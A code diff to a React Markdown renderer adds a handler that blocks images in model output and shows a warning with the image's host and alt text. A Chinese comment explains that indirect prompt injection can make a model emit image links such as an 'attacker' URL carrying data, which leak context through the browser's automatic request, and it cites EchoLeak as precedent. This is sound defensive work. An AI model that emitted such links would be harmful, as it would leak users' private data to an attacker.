@@ -5,7 +5,7 @@ import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
 import type { SyntaxHighlighterProps } from "react-syntax-highlighter";
 import { useI18n } from "../i18n/context";
-import { CheckIcon, CopyIcon } from "./icons";
+import { CheckIcon, CopyIcon, WarningIcon } from "./icons";
 
 /**
  * `Prism` 会静态打进 300 种语法（约 1 MB）。`PrismAsyncLight` 只加载实际用到的语言，
@@ -89,11 +89,44 @@ function CodeBlock({ language, code }: { language: string; code: string }) {
   );
 }
 
+/** 绝对/相对 URL 都能解析出展示用的域名；解析不了就当没有域名（渲染处再兜 "?"）。 */
+function safeHost(raw: string): string {
+  try {
+    return new URL(raw, window.location.origin).host;
+  } catch {
+    return "";
+  }
+}
+
 export default function Markdown({ content }: { content: string }) {
+  const { t } = useI18n();
   return (
     <ReactMarkdown
       remarkPlugins={[remarkGfm]}
       components={{
+        /**
+         * 模型输出里的图片一律不加载。
+         *
+         * `![x](https://attacker/p?d=…)` 不是一张图，而是**浏览器自己会发起的一个出站请求**：
+         * 它带着用户的 Cookie/Referer 环境，可以把上下文按像素逐位外送（零点击外泄的真实先例
+         * 是 M365 Copilot 的 EchoLeak）。这个产品是纯文本知识库 —— 上传白名单里连图片都不收，
+         * 所以消息里的图片没有任何正当用途，而间接提示注入是可以让模型主动吐出这种链接的。
+         * 拦掉之后不静默吞：把 alt 与目标域名显示出来，让用户知道模型想放什么、并据此判断那次回答。
+         */
+        img({ src, alt }) {
+          const raw = typeof src === "string" ? src : "";
+          const host = raw ? safeHost(raw) : "";
+          return (
+            <span
+              className="my-1.5 inline-flex items-center gap-1.5 rounded-[--radius-xs] border border-line bg-surface-sunken px-2 py-1 text-[11px] text-ink-subtle"
+              title={raw}
+            >
+              <WarningIcon className="h-3 w-3 shrink-0" aria-hidden />
+              {t("ui.blockedImage", { host: host || "?" })}
+              {alt ? ` · ${alt}` : ""}
+            </span>
+          );
+        },
         code({ className, children, ...props }) {
           const match = /language-(\w+)/.exec(className || "");
           const raw = String(children).replace(/\n$/, "");
